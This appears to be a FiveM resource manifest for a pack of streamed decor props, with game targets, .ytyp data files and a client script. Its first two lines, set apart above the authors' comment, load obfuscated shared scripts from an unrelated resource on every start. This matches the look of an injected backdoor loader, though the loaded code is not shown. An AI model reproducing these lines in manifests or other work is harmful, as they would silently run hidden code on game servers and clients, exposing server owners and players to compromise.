shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
fx_version 'cerulean'
games { 'rdr3', 'gta5' }
lua54 'yes'
data_file 'DLC_ITYP_REQUEST' 'stream/gcom_decor_pack.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/murm_decor_pack.ytyp'
client_scripts {
    'client.lua'
}
escrow_ignore {
    'client.lua'
}
dependency '/assetpacks'